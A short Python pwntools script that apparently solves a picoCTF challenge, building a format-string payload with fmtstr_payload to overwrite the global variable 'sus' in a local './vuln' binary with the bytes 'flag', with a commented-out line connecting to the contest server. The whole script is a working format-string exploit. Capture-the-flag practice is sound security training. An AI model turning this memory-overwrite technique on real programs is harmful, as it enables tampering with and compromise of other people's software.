from pwn import *

bin = './vuln'
context.binary = bin

e = ELF(bin)

p = process(bin)  # offline
# p = connect('rhea.picoctf.net', 55048)  # online

sus_addr = e.symbols[b'sus']
print(sus_addr)

payload = fmtstr_payload(14, {sus_addr: 0x67616c66}, write_size='byte')
print(f"payload: {payload}")

p.recvuntil(b'What do you have to say?')
p.sendline(payload)

# Instead of interactive
output = p.recvall()
print(output.decode(errors="ignore"))
